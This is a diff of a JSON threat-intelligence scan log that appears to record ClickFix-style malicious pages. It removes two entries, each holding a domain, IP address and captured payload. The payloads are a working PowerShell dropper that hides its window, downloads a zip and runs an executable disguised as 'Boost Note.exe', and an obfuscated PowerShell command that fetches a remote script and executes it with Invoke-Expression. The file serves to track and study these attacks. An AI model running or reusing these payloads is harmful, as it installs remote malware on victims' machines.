@@ -11473,40 +11473,5 @@
     ],
     "ReportId": "cmwjbc38k17of0omlpeppcn8t",
     "ScannedAt": "2026-11-16T13:42:21.861000+00:00"
-  },
-  {
-    "UrlDomain": "kiragu.co.ke",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "169.239.181.174"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwj87puz17h00omlv4msyyuh",
-    "ScannedAt": "2026-11-16T12:14:59.001000+00:00"
-  },
-  {
-    "UrlDomain": "status.reido.in",
-    "DeliveryUrl": [
-      "cvgvqio6.txt",
-      "window.clipboarddata.setdata"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [],
-    "Payload": "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwj82izp17gf0omlbix28awg",
-    "ScannedAt": "2026-11-16T12:10:56.873000+00:00"
   }
 ]
